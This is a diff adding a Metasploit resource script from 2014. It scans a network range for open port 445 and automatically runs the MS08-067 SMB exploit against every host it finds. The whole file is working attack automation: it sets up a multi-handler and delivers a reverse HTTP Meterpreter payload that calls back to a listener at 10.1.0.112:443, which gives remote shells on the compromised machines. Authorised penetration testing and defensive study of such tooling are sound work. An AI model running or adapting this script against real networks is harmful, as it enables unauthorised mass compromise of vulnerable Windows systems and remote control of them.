@@ -1,0 +1,62 @@
+#################################################
+# Created by @jgaudard
+# Resource file for metasploit
+# Auto exploits by setting up a multi-handler, then running
+# an NMAP scan for port 445, and finally uses MS08_067 against
+# any targets with port 445 open.
+# Created: 10 September 2014    Edited: 15 September 2014
+# Version 1.1
+#################################################
+ 
+ 
+ 
+<ruby>
+ 
+# Setting up variables
+# With some slight modifications, you can use different exploits like MS03_026
+lhost = "10.1.0.112"
+lport = "443"
+handler = "exploit/multi/handler"
+exploit = "exploit/windows/smb/ms08_067_netapi"
+payload = "windows/meterpreter/reverse_http"
+targets = "10.1.1-9.10" #accepts targets formated for nmap CIDR, Comma, or Dash.
+port = "445"
+ 
+ 
+# Setting Global Options
+run_single("setg LHOST #{lhost}")
+ 
+# Starting Mulit-Handler
+# You probably don't need this if you are going to connect to a cobalt strike team server
+run_single("use #{handler}")
+run_single("set PAYLOAD #{payload}")
+run_single("set LPORT #{lport}")
+run_single("set ExitOnSession false")
+run_single("exploit -j -z")
+ 
+# Setup Workspace
+run_single("workspace -d autopwn")
+run_single("workspace -a autopwn")
+run_single("workspace autopwn")  #probably redundant
+ 
+# Runs NMAP
+run_single("db_nmap -sS -p #{port} #{targets}")
+ 
+# Let there be magic!
+framework.db.hosts.each do |host|
+        host.services.each do |service|
+                if service.name == "microsoft-ds" and service.state == "open"
+                        print_line("exploiting #{host.address}")
+                        run_single("use #{exploit}")
+                        run_single("set RHOST #{host.address}")
+                        run_single("set PAYLOAD #{payload}")
+                        run_single("set LPORT #{lport}")
+                        run_single("set DisablePayloadHandler true")
+                        run_single("exploit -j")
+                        run_single("back")
+                end
+        end
+end
+ 
+</ruby>
+
